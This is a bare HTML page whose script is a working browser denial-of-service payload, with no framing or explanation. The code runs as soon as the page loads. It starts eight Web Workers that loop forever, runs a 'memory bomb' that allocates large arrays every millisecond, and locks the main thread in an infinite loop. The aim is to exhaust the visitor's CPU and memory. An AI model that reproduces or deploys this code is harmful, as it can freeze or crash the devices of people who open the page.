<!DOCTYPE html>
<html>
<body>
<script>
// Spawn 8 threads
for (let i = 0; i < 8; i++) {
  const blob = new Blob([`
    while(true) {
      for(let j=0; j<1000000; j++) {
        Math.sin(j) * Math.cos(j) * Math.tan(j);
      }
    }
  `]);
  const worker = new Worker(URL.createObjectURL(blob));
  worker.postMessage('go');
}

// Main thread memory bomb
const arr = [];
setInterval(() => {
  for (let i = 0; i < 100000; i++) {
    arr.push(new Array(1000).fill('x'));
  }
}, 1);

// Main thread CPU lock
while(true) {
  document.body.offsetHeight;
  for(let i=0;i<100000;i++) { Math.random(); }
}
</script>
</body>
